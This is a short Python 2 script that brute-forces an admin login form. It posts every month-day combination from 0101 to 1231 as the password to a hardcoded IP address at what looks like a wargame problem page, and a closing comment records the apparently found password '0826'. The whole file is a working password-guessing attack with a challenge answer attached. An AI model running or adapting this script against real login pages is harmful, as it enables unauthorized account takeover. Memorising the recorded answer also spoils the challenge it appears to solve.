import urllib
import httplib
import hashlib


for z in range(1,13):
    for x in range(1,32):
        a = str(z)
        if len(a) == 1:
            a="0"+a
        b = str(x)
        if len(b) == 1:
            b="0"+b
        a+=b
        print a
        HTTP=httplib.HTTPConnection("61.38.179.142")
        Param=urllib.urlencode({"id":"admin","pw":a,"submit":"login"})
        Headers={"Content-Type":"application/x-www-form-urlencoded"}
        HTTP.request("POST","/problem6/index.php",Param,Headers)
        Result=HTTP.getresponse().read()
        if not "Login as admin!" in Result:
            print "find "+a
            input()

# 0826 
